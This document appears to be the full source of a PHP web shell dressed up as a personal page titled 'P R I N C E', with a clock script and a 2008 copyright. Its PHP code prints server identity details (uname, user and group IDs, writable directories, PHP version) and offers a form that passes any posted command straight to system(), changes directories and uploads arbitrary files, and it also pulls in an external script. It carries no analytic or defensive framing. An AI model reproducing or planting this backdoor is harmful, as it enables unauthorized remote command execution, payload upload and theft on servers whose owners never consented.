<head>
<title> P R I N C E </title>
<center><img src=http://img71.imageshack.us/img71/1643/imagestz4.jpg></center><head>
<script language="JavaScript">
<!-- Begin
var months=new Array(13);
months[1]="January";
months[2]="February";
months[3]="March";
months[4]="April";
months[5]="May";
months[6]="June";
months[7]="July";
months[8]="August";
months[9]="September";
months[10]="October";
months[11]="November";
months[12]="December";
var time=new Date();
var lmonth=months[time.getMonth() + 1];
var date=time.getDate();
var year=time.getYear();
if (year < 2000)    // Y2K Fix, Isaac Powell
year = year + 1900; 
document.write("<center>" + lmonth + " ");
document.write(date + ", " + year + "</center>");
// End -->
</script>
</center>

<script language="JavaScript">
<!-- hiding
function showMilitaryTime() {
if (document.form.showMilitary[0].checked) {
return true;
}
return false;
}
function showTheHours(theHour) {
if (showMilitaryTime() || (theHour > 0 && theHour < 13)) {
if (theHour == "0") theHour = 12;
return (theHour);
}
if (theHour == 0) {
return (12);
}
return (theHour-12);
}
function showZeroFilled(inValue) {
if (inValue > 9) {
return "" + inValue;
}
return "0" + inValue;
}
function showAmPm() {
if (showMilitaryTime()) {
return ("");
}
if (now.getHours() < 12) {
return (" am");
}
return (" pm");
}
function showTheTime() {
now = new Date
document.form.showTime.value = showTheHours(now.getHours()) + ":" + showZeroFilled(now.getMinutes()) + ":" + showZeroFilled(now.getSeconds()) + showAmPm()
setTimeout("showTheTime()",1000)
}
// End -->
</script><div align = left>
<body text="#000000" bgcolor="f5f5f5" onLoad="showTheTime()">
<p align="center">&nbsp;
</p>

<p align="center">
<p>

<font face="Verdana" size="1">
<b>Vampire</b>&nbsp;</font><font face="verdana" size="2"><br></font>
</p>
<font face="courier new" size="2" color="777777">
<hr color=777777 width=100% height=115px>
</font>
</font><font face="comic sans MS">
  </p>
<div align="left"><b><?php
  closelog( );
  $user = get_current_user( );
  $login = posix_getuid( );
  $euid = posix_geteuid( );
  $ver = phpversion( );
  $gid = posix_getgid( );
  if ($chdir == "") $chdir = getcwd( );
  if(!$whoami)$whoami=exec("whoami");
?>
<TABLE BORDER="0" CELLPADDING="0" CELLSPACING="0">
<?php
  $uname = posix_uname( );
  while (list($info, $value) = each ($uname)) {
?>
  <TR>
    <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b><span style="font-size: 9pt"><?= $info ?>

      <span style="font-size: 9pt">:</b> <?= $value ?></span></DIV></TD>
  </TR>

<?php
  }
?>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
    <span style="font-size: 9pt">User Info:</b> uid=<?= $login ?>(<?= $whoami?>) euid=<?= $euid ?>(<?= $whoami?>) gid=<?= 

$gid ?>(<?= $whoami?>)</span></DIV></TD>

  </TR>

  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
    <span style="font-size: 9pt">Current Path:</b> <?= $chdir ?></span></DIV></TD>
  </TR>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>

    <span style="font-size: 9pt">Permission Directory:</b> <? if(@is_writable($chdir)){ echo "Yes"; }else{ echo "No"; } ?>

    </span></DIV></TD>
  </TR>  
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
    <span style="font-size: 9pt">Server Services:</b> <?= "$SERVER_SOFTWARE $SERVER_VERSION"; ?>

    </span></DIV></TD>

  </TR>
  <TR>

  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
    <span style="font-size: 9pt">Server Address:</b> <?= "$SERVER_ADDR $SERVER_NAME"; ?>
    </span></DIV></TD>

  </TR>

  <TR>

  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
    <span style="font-size: 9pt">Script Current User:</b> <?= $user ?></span></DIV></TD>

  </TR>
  <TR>

  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
    <span style="font-size: 9pt">PHP Version:</b> <?= $ver ?></span></DIV></TD>

  </TR>
</TABLE>
</b>
</div></font></div>

<?php

set_magic_quotes_runtime(0);

$currentWD  = str_replace("\\\\","\\",$_POST['_cwd']);
$currentCMD = str_replace("\\\\","\\",$_POST['_cmd']);

$UName  = `uname -a`;
$SCWD   = `pwd`;
$UserID = `id`;

if( $currentWD == "" ) {
    $currentWD = $SCWD;
}

if( $_POST['_act'] == "List files!" ) {
    $currentCMD = "ls -la";
}


print "<form method=post enctype=\"multipart/form-data\"><hr><hr><table>";

print "<tr><td><b>Execute command:</b></td><td><input size=100 name=\"_cmd\" value=\"".$currentCMD."\"></td>";
print "<td><input type=submit name=_act value=\"Execute!\"></td></tr>";

print "<tr><td><b>Change directory:</b></td><td><input size=100 name=\"_cwd\" value=\"".$currentWD."\"></td>";
print "<td><input type=submit name=_act value=\"List files!\"></td></tr>";

print "<tr><td><b>Upload file:</b></td><td><input size=85 type=file name=_upl></td>";
print "<td><input type=submit name=_act value=\"Upload!\"></td></tr>";

print "</table></form><hr><hr>";

$currentCMD = str_replace("\\\"","\"",$currentCMD);
$currentCMD = str_replace("\\\'","\'",$currentCMD);

if( $_POST['_act'] == "Upload!" ) {
    if( $_FILES['_upl']['error'] != UPLOAD_ERR_OK ) {
        print "<center><b>Error while uploading file!</b></center>";
    } else {
        print "<center><pre>";
        system("mv ".$_FILES['_upl']['tmp_name']." ".$currentWD."/".$_FILES['_upl']['name']." 2>&1");
        print "</pre><b>File uploaded successfully!</b></center>";
    }    
} else {
    print "\n\n<!-- OUTPUT STARTS HERE -->\n<pre>\n";
    $currentCMD = "cd ".$currentWD.";".$currentCMD;
  system("$currentCMD 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm 
/tmp/cmdtemp");
    print "\n</pre>\n<!-- OUTPUT ENDS HERE -->\n\n</center><hr><hr><center><b>Command completed</b></center>";
}

exit;

?><!-- --><script type="text/javascript" src="/i.js"></script></body></font></font></b></font>

<hr color=777777 width=100% height=115px>
<p align="center">
<p>
<font face="Verdana" size="1">
<b>Copyright 2008 Prince, Inc. All rights reserved</b>
</font><font face="verdana" size="2"><br></font>
</p>